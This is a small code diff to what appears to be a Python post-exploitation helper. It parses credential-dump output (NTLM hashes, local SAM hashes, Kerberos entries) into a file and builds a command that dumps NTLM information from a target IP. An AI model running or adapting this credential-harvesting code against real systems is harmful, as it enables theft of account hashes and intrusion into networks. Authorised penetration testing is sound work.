@@ -45,7 +45,7 @@ def get_domain_name(filepath):
 
 def get_NTML_hash(filepath):
     try:
-        with open(filepath, 'r') as f, open('output.txt', 'w') as of:
+        with open(filepath, 'r') as f, open('./output.txt', 'w') as of:
             for line in f:
                 if line.strip().startswith('RID  :') or line.strip().startswith('User :'):
                     of.write(line.strip() + "\n")
@@ -115,7 +115,7 @@ def process_secrets_dump(filepath):
             elif kerberos_flag:
                 kerberos_info.append(line.strip())
 
-    with open('output.txt', 'a') as of:
+    with open('./output.txt', 'a') as of:
         of.write("Local SAM Hashes:\n")
         for hash in sam_hashes:
             of.write(f"{hash}\n")
@@ -168,10 +168,8 @@ try:
 except KeyError as e:
     print(f"There was an error: {e}")
 
-###
-### Use the process function and see if it works to filter out useless info. Needs input path
-###
-
+# Use the process function and see if it works to filter out useless info. Needs input path
+process_secrets_dump("c:\\temp\\secOutput.txt")
 
 # Dump the NTLM Info
 dumpNTLMCommand = f"py {dumpNTMLInfo_path} {targetIP} >> c:\\temp\\NTLMInfo.txt"
